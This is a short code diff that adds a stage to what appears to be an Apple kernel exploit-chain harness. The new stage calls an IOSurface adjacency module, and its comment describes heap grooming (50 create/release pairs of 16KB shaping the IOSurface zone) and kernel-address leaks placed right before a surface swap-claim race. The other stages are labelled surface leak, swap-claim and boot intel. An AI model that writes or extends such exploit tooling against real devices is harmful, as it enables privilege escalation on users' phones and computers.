@@ -14,6 +14,7 @@
 #import "P170T8150Composite.h"
 #import "P139BootIntel.h"
 #import "P114SurfaceLeak.h"
+#import "P159IOSurfaceAdjacency.h"
 #import "P110SurfaceSwapClaim.h"
 #import "P142AVETemporal.h"
 #import "P007Board.h"
@@ -108,6 +109,16 @@ static void p170_sighandler(int sig, siginfo_t *si, void *uctx) {
     @try { p170_line([P114SurfaceLeak tap]); }
     @catch (NSException *e) { p170_line([NSString stringWithFormat:@"[-] P114 exception %@", e.name]); }
     p170_line(@"[2 done]");
+
+    /* 2b. IOSURFACE ADJACENCY (pre-groom + anchor bank; read-only/panic-free).
+       p159's 50x16KB create/release pairs shape the IOSurface zone right
+       before the claim race, and its kernel-range KVA rows label WHO lands
+       adjacent to our surfaces — the neighbor-identity the family-B window
+       asks. Receipts = LEAK class (rung-3 anchors); never hasKread. */
+    p170_line(@"\n[2b ADJ] P159IOSurfaceAdjacency (SurfHeist read-only pairs) —");
+    @try { p170_line([P159IOSurfaceAdjacency tap]); }
+    @catch (NSException *e) { p170_line([NSString stringWithFormat:@"[-] P159 exception %@", e.name]); }
+    p170_line(@"[2b done]");
 
     /* 3. CLAIM (the 112477 swap-claim race; v2 pairs the leak itself) */
     p170_line(@"\n[3 CLAIM] P110SurfaceSwapClaim —");
